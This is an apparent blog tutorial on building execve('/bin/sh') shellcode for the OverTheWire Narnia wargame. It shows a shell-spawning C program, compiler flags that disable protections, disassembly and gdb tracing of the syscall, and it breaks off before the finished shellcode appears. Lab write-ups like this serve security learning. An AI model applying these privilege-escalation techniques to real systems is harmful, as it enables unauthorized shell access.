@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Creating ShellCode On Narnia - noopz</title><meta name="Description" content="A guide on creating some simple shellcode for the OverTheWire challenges - based on the book ShellCoder&#39;s Handbook."><meta property="og:title" content="Creating ShellCode On Narnia" />
+<meta property="og:description" content="A guide on creating some simple shellcode for the OverTheWire challenges - based on the book ShellCoder&#39;s Handbook." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/shellcode-on-narnia/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-07-04T08:26:53+00:00" />
+<meta property="article:modified_time" content="2020-07-04T08:26:53+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Creating ShellCode On Narnia"/>
+<meta name="twitter:description" content="A guide on creating some simple shellcode for the OverTheWire challenges - based on the book ShellCoder&#39;s Handbook."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/shellcode-on-narnia/" /><link rel="prev" href="https://noopz.github.io/narnia_challenges_part1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Creating ShellCode On Narnia",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/shellcode-on-narnia\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, narnia, wargames, shellcode","wordcount":  2200 ,
+        "url": "https:\/\/noopz.github.io\/shellcode-on-narnia\/","datePublished": "2020-07-04T08:26:53+00:00","dateModified": "2020-07-04T08:26:53+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "A guide on creating some simple shellcode for the OverTheWire challenges - based on the book ShellCoder's Handbook."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Creating ShellCode On Narnia</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-04">2020-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2200 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="noopener noreffer">The Shellcoders Handbook</a> was the foundation of most of the write up. It&rsquo;s based largely on the contents of Chapter 3 - Spawining a Shell. I&rsquo;ve adapted it to work on the OverTheWire server used for the narnia challenges - mostly making sure the various protections are disabled. These protections are disabled since we want to rely on very specific locations in order to set the shellcode up correctly. This particular bit of shell code just calls <a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="noopener noreffer">execve</a> with <code>/bin/sh</code>. When combined with a vulnerable program that has elevated privileges it&rsquo;ll spawn a shell with that access level - in the case of the narnia challenges, the next level. There already exists a lot of pre-generated shellcode out there (<a href="http://shell-storm.org/shellcode/)">http://shell-storm.org/shellcode/)</a>, however part of the fun is to understand the fundamentals and try doing it myself.</p>
+<blockquote>
+<p>Fair warning, this is my first attempt at creating some shellcode.</p>
+</blockquote>
+<p>To get started, need a simple C program to launch a shell using <code>execve</code>. Since this being done on the OverTheWire servers the only writable location is <code>/tmp/</code>, so everything will take place in a folder that was created there.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">narnia1</span><span class="err">@</span><span class="nl">narnia</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">makemyown</span><span class="err">$</span> <span class="n">cat</span> <span class="n">simpleshell</span><span class="p">.</span><span class="n">c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">happy</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="n">happy</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+    <span class="n">happy</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">happy</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">happy</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Once that source is saved, it&rsquo;s time to compile it. To disable all of the things that would get in the away when creating some shellcode, it needs to be compiled with with <code>static</code> set in GCC so there&rsquo;s no dynamic linking, no stack protector, and no position-independent-executable (pie). Additionally, to make things easy, let&rsquo;s make sure we compile it as a 32bit binary (<code>-m32</code>).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/makemyown$ gcc -o simpleshell simpleshell.c -m32 -static -fno-stack-protector -fno-pie
+</code></pre></td></tr></table>
+</div>
+</div><p>If all went well and no compilation errors, try running it to make sure it actually spawns a shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/makemyown$ ./simpleshell
+$ ls
+simpleshell  simpleshell.c
+</code></pre></td></tr></table>
+</div>
+</div><p>Now the fun part, dumping out all the assembly (with <code>objdump</code>) and identifying what actually matters for creating the shellcode in as few bytes as possible.</p>
+<p>First the <code>main</code> function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">080489</span><span class="n">cc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">80489</span><span class="n">cc</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="m">4</span><span class="n">c</span> <span class="m">24</span> <span class="m">04</span>             <span class="n">lea</span>    <span class="mh">0x4</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">ecx</span>
+ <span class="m">80489</span><span class="n">d0</span><span class="o">:</span>       <span class="m">83</span> <span class="n">e4</span> <span class="n">f0</span>                <span class="n">and</span>    <span class="o">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 80489d3:       ff 71 fc                pushl  -0x4(%</span><span class="n">ecx</span><span class="p">)</span>
+ <span class="m">80489</span><span class="n">d6</span><span class="o">:</span>       <span class="m">55</span>                      <span class="n">push</span>   <span class="o">%ebp
+</span><span class="o"> 80489d7:       89 e5                   mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span><span class="o"> 80489d9:       51                      push   %</span><span class="n">ecx</span>
+ <span class="m">80489</span><span class="n">da</span><span class="o">:</span>       <span class="m">83</span> <span class="n">ec</span> <span class="m">14</span>                <span class="n">sub</span>    <span class="o">$</span><span class="mh">0x14</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 80489dd:       c7 45 f0 08 c3 0b 08    movl   $0x80bc308,-0x10(%</span><span class="n">ebp</span><span class="p">)</span> <span class="c1"># happy[0] = /bin/sh</span>
+ <span class="m">80489e4</span><span class="o">:</span>       <span class="n">c7</span> <span class="m">45</span> <span class="n">f4</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    <span class="n">movl</span>   <span class="o">$</span><span class="mh">0x0</span><span class="p">,</span><span class="m">-0</span><span class="nf">xc</span><span class="p">(</span><span class="o">%ebp)        # happy[1] = NULL
+</span><span class="o"> 80489eb:       8b 45 f0                mov    -0x10(%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%eax       # $eax = happy[0]
+</span><span class="o"> 80489ee:       83 ec 04                sub    $0x4,%</span><span class="n">esp</span>
+ <span class="m">80489</span><span class="n">f1</span><span class="o">:</span>       <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                   <span class="n">push</span>   <span class="o">$</span><span class="mh">0x0</span>                   <span class="c1"># NULL onto stack</span>
+ <span class="m">80489</span><span class="n">f3</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="m">55</span> <span class="n">f0</span>                <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x10</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">edx</span>       <span class="c1"># $edx = happy</span>
+ <span class="m">80489</span><span class="n">f6</span><span class="o">:</span>       <span class="m">52</span>                      <span class="n">push</span>   <span class="o">%edx                   # happy onto stack
+</span><span class="o"> 80489f7:       50                      push   %</span><span class="n">eax</span>                   <span class="c1"># happy[0] onto stack</span>
+ <span class="m">80489</span><span class="n">f8</span><span class="o">:</span>       <span class="n">e8</span> <span class="m">13</span> <span class="m">4</span><span class="n">d</span> <span class="m">02</span> <span class="m">00</span>          <span class="n">call</span>   <span class="m">806</span><span class="n">d710</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">&gt;</span>
+ <span class="m">80489</span><span class="n">fd</span><span class="o">:</span>       <span class="m">83</span> <span class="n">c4</span> <span class="m">10</span>                <span class="n">add</span>    <span class="o">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 8048a00:       b8 00 00 00 00          mov    $0x0,%</span><span class="n">eax</span>
+ <span class="m">8048</span><span class="n">a05</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">4</span><span class="n">d</span> <span class="n">fc</span>                <span class="n">mov</span>    <span class="m">-0</span><span class="nf">x4</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">ecx</span>
+ <span class="m">8048</span><span class="n">a08</span><span class="o">:</span>       <span class="n">c9</span>                      <span class="n">leave</span>  
+ <span class="m">8048</span><span class="n">a09</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="m">61</span> <span class="n">fc</span>                <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x4</span><span class="p">(</span><span class="o">%ecx),%</span><span class="n">esp</span>
+ <span class="m">8048</span><span class="n">a0c</span><span class="o">:</span>       <span class="n">c3</span>                      <span class="n">ret</span>
+ <span class="m">8048</span><span class="n">a0d</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">8048</span><span class="n">a0f</span><span class="o">:</span>       <span class="m">90</span>                      <span class="n">nop</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now the <code>execv</code> function, which is the ultimate target and focus for creating the shellcode:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">0806</span><span class="n">d710</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">&gt;:</span>
+ <span class="m">806</span><span class="n">d710</span><span class="o">:</span>       <span class="m">53</span>                      <span class="n">push</span>   <span class="o">%ebx
+</span><span class="o"> 806d711:       8b 54 24 10             mov    0x10(%</span><span class="n">esp</span><span class="p">),</span><span class="o">%edx
+</span><span class="o"> 806d715:       8b 4c 24 0c             mov    0xc(%</span><span class="n">esp</span><span class="p">),</span><span class="o">%ecx
+</span><span class="o"> 806d719:       8b 5c 24 08             mov    0x8(%</span><span class="n">esp</span><span class="p">),</span><span class="o">%ebx
+</span><span class="o"> 806d71d:       b8 0b 00 00 00          mov    $0xb,%</span><span class="n">eax</span>
+ <span class="m">806</span><span class="n">d722</span><span class="o">:</span>       <span class="n">ff</span> <span class="m">15</span> <span class="n">f0</span> <span class="n">b9</span> <span class="m">0</span><span class="n">e</span> <span class="m">08</span>       <span class="n">call</span>   <span class="o">*</span><span class="mh">0x80eb9f0</span>
+ <span class="m">806</span><span class="n">d728</span><span class="o">:</span>       <span class="m">5</span><span class="n">b</span>                      <span class="n">pop</span>    <span class="o">%ebx
+</span><span class="o"> 806d729:       3d 01 f0 ff ff          cmp    $0xfffff001,%</span><span class="n">eax</span>
+ <span class="m">806</span><span class="n">d72e</span><span class="o">:</span>       <span class="m">0</span><span class="n">f</span> <span class="m">83</span> <span class="n">fc</span> <span class="m">3</span><span class="n">a</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">jae</span>    <span class="m">8071230</span> <span class="o">&lt;</span><span class="n">__syscall_error</span><span class="o">&gt;</span>
+ <span class="m">806</span><span class="n">d734</span><span class="o">:</span>       <span class="n">c3</span>                      <span class="n">ret</span>
+ <span class="m">806</span><span class="n">d735</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">806</span><span class="n">d737</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">806</span><span class="n">d739</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">806</span><span class="n">d73b</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">806</span><span class="n">d73d</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+ <span class="m">806</span><span class="n">d73f</span><span class="o">:</span>       <span class="m">90</span>                      <span class="n">nop</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>These should prepare the registers with the values of <code>happy[0]</code>, <code>happy</code> and the <code>NULL</code> of the system call we&rsquo;d like to make (<code>0xb</code>, aka <code>execve</code>).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d731</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">54</span> <span class="m">24</span> <span class="m">10</span>             <span class="n">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">edx</span>
+ <span class="m">806</span><span class="n">d735</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">4</span><span class="n">c</span> <span class="m">24</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">ecx</span>
+ <span class="m">806</span><span class="n">d739</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">5</span><span class="n">c</span> <span class="m">24</span> <span class="m">08</span>             <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">ebx</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This line moves <code>0xb</code> into <code>$eax</code> to handle the <code>execve</code> call.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d73d</span><span class="o">:</span>       <span class="n">b8</span> <span class="m">0</span><span class="n">b</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          <span class="n">mov</span>    <span class="o">$</span><span class="mh">0xb</span><span class="p">,</span>%<span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Verifying by taking a peek at <code>$ebx</code>, first get the address stored in <code>$ebx</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="o">$</span><span class="n">ebx</span>
+<span class="o">$</span><span class="m">8</span> <span class="o">=</span> <span class="mh">0x80bc328</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Then dump the contents of that address:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80bc328</span>
+<span class="mh">0x80bc328</span><span class="o">:</span> <span class="s">&#34;/bin/sh&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next, to figure out what the <code>call</code> does. Ideally this is the way to get to the <code>syscall</code> - which in theory works it way to an int <code>0x80</code> call (aka, a transition to the kernel):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d742</span><span class="o">:</span>       <span class="n">ff</span> <span class="m">15</span> <span class="n">f0</span> <span class="n">b9</span> <span class="m">0</span><span class="n">e</span> <span class="m">08</span>       <span class="n">call</span>   <span class="o">*</span><span class="mh">0x80eb9f0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Stepping into this function reveals the following, which isn&rsquo;t quite what was expected:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">10i</span> <span class="o">$</span><span class="n">pc</span>
+<span class="o">=&gt;</span> <span class="mh">0xf7ffcc90</span> <span class="o">&lt;</span><span class="n">__kernel_vsyscall</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="o">%ecx
+</span><span class="o">   0xf7ffcc91 &lt;__kernel_vsyscall+1&gt;: push   %</span><span class="n">edx</span>
+   <span class="mh">0xf7ffcc92</span> <span class="o">&lt;</span><span class="n">__kernel_vsyscall</span><span class="m">+2</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="o">%ebp
+</span><span class="o">   0xf7ffcc93 &lt;__kernel_vsyscall+3&gt;: mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span><span class="o">   0xf7ffcc95 &lt;__kernel_vsyscall+5&gt;: sysenter
+</span><span class="o">   0xf7ffcc97 &lt;__kernel_vsyscall+7&gt;: int    $0x80
+</span><span class="o">   0xf7ffcc99 &lt;__kernel_vsyscall+9&gt;: pop    %</span><span class="n">ebp</span>
+   <span class="mh">0xf7ffcc9a</span> <span class="o">&lt;</span><span class="n">__kernel_vsyscall</span><span class="m">+10</span><span class="o">&gt;:</span> <span class="n">pop</span>    <span class="o">%edx
+</span><span class="o">   0xf7ffcc9b &lt;__kernel_vsyscall+11&gt;: pop    %</span><span class="n">ecx</span>
+   <span class="mh">0xf7ffcc9c</span> <span class="o">&lt;</span><span class="n">__kernel_vsyscall</span><span class="m">+12</span><span class="o">&gt;:</span> <span class="n">ret</span>  
+</code></pre></td></tr></table>
+</div>
+</div><p>However, we know that this must eventually get to the right place as we end up in the Kernel calls. But it&rsquo;s still unclear what <code>0x80eb9f0</code> refers to. So <code>objdump</code> to the rescuse to help sort that out a bit more.</p>
+<p>Using the following command we can get more info:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/makemyown$ objdump -s simpleshell &gt; simpleshelldump.txt
+narnia1@narnia:/tmp/makemyown$ grep 80eb9f0 simpleshelldump.txt
+ 80eb9f0 <span class="m">40010708</span> 70ae0908 <span class="m">07000000</span> 7f030000  @...p...........
+</code></pre></td></tr></table>
+</div>
+</div><p>Using <code>40010708</code> and converting it from little-endian to big-endian, we get: <code>08070140</code></p>
+<p>And looking back at the overall dump with <code>08070140</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">08070140</span> <span class="o">&lt;</span><span class="n">_dl_sysinfo_int80</span><span class="o">&gt;:</span>
+ <span class="m">8070140</span><span class="o">:</span>       <span class="n">cd</span> <span class="m">80</span>                   <span class="n">int</span>    <span class="o">$</span><span class="mh">0x80</span>
+ <span class="m">8070142</span><span class="o">:</span>       <span class="n">c3</span>                      <span class="n">ret</span>
+ <span class="m">8070143</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="n">b6</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">lea</span>    <span class="mh">0x0</span><span class="p">(</span><span class="o">%esi),%</span><span class="n">esi</span>
+ <span class="m">8070149</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="n">bc</span> <span class="m">27</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    <span class="n">lea</span>    <span class="mh">0x0</span><span class="p">(</span><span class="o">%edi,%</span><span class="n">eiz</span><span class="p">,</span><span class="m">1</span><span class="p">),</span>%<span class="n">edi</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now that all of the important pieces have been located with their appropriate byte code. It&rsquo;s time to work on extracting the very minimum we care about and coming up with a game plan of how to implement the shellcode. First lets find the string for <code>/bin/shell</code> and where it gets stored into memory.</p>
+<p>The overall goal is the following:</p>
+<ol>
+<li>Get <code>/bin/sh</code> into memory</li>
+<li>Get <code>NULL</code> into memory</li>
+<li>Push <code>NULL</code> onto the stack</li>
+<li>Push <code>happy</code> onto the stack</li>
+<li>Push <code>happy[0]</code> onto the stack</li>
+<li>Push value for <code>execve</code> onto the stack</li>
+<li>Make the <code>syscall</code></li>
+</ol>
+<p>First up is the string <code>/bin/sh</code>, by looking over <code>main</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
